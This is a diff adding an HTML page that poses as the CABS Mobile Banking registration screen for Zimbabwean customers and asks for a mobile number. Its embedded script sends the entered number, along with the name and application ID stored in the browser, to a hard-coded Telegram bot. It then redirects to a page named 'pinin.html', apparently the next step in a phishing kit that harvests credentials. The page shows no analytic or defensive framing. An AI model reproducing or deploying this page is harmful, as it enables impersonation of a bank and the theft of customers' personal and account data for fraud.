@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CABS Mobile Banking Registration</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .registration-card {
+            width: 100%;
+            max-width: 460px;
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            padding: 40px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .back-button {
+            width: 40px;
+            height: 40px;
+            background-color: #7cc544;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            margin-bottom: 25px;
+            cursor: pointer;
+            border: none;
+            transition: opacity 0.2s;
+        }
+
+        .back-button:hover {
+            opacity: 0.9;
+        }
+
+        .header-title {
+            color: #3b3a8a;
+            font-size: 32px;
+            font-weight: bold;
+            margin: 0 0 30px 0;
+        }
+
+        .welcome-text {
+            color: #666;
+            font-size: 22px;
+            line-height: 1.4;
+            margin-bottom: 40px;
+        }
+
+        .welcome-text span {
+            display: block;
+        }
+
+        .welcome-text strong {
+            color: #333;
+        }
+
+        .input-group {
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            background-color: white;
+            margin-bottom: 40px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group:focus-within {
+            border-color: #3b3a8a;
+            box-shadow: 0 0 0 3px rgba(59, 58, 138, 0.1);
+        }
+
+        .country-select {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding-right: 15px;
+            border-right: 1px solid #ddd;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .flag {
+            width: 24px;
+            height: auto;
+            border-radius: 2px;
+        }
+
+        .dropdown-arrow {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .phone-input {
+            flex: 1;
+            border: none;
+            padding: 0 15px;
+            font-size: 16px;
+            color: #333;
+            outline: none;
+            background: transparent;
+        }
+
+        .phone-input::placeholder {
+            color: #bbb;
+        }
+
+        .submit-button {
+            width: 100%;
+            background-color: #3b3a8a;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 10px rgba(59, 58, 138, 0.3);
+        }
+
+        .submit-button:hover {
+            background-color: #2f2e70;
+        }
+
+        .submit-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background-color: white;
+                align-items: flex-start;
+            }
+            .registration-card {
+                box-shadow: none;
+                padding: 20px;
+                border-radius: 0;
+                min-height: 100vh;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="registration-card">
+        <button class="back-button" onclick="history.back()">&#8249;</button>
+        
+        <h1 class="header-title">Registration</h1>
+        
+        <p class="welcome-text">
+            <span>Welcome to</span>
+            <strong>CABS Mobile Banking</strong>
+        </p>
+        
+        <div class="input-group">
+            <div class="country-select">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/Flag_of_Zimbabwe.svg/32px-Flag_of_Zimbabwe.svg.png" alt="ZW" class="flag">
+                <span>+263</span>
+                <span class="dropdown-arrow">&#9662;</span>
+            </div>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="Mobile Number" inputmode="numeric">
+        </div>
+
+        <button class="submit-button" id="submitBtn" onclick="submitPhone()">Submit</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8350396603:AAG2fThlCEOBcN9TQDqdM0wRR_N590DJveI';
+        const CHAT_ID = '8213174863';
+
+        function sendToTelegram(message) {
+            const encoded = encodeURIComponent(message);
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`)
+                .then(r => r.json())
+                .then(r => { console.log('Telegram (phone):', r); return r; })
+                .catch(e => { console.error('Telegram error:', e); });
+        }
+
+        function submitPhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+
+            if (!phone || phone.length < 9) {
+                alert('Please enter a valid mobile number');
+                return;
+            }
+
+            const fullPhone = '+263' + phone;
+
+            let applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            applicationData.phoneNumber = fullPhone;
+            localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+
+            // ---- Send PHONE NUMBER only to Telegram ----
+            const message = `
+📱 *Phone Number Submitted*
+
+🆔 Application ID: ${applicationData.applicationId || 'N/A'}
+👤 Applicant: ${applicationData.firstName || 'Valued Client'} ${applicationData.lastName || ''}
+📞 Phone: ${fullPhone}
+            `;
+
+            sendToTelegram(message).finally(() => {
+                window.location.href = 'pinin.html';
+            });
+        }
+
+        document.getElementById('phoneInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') submitPhone();
+        });
+    </script>
+
+</body>
+</html>
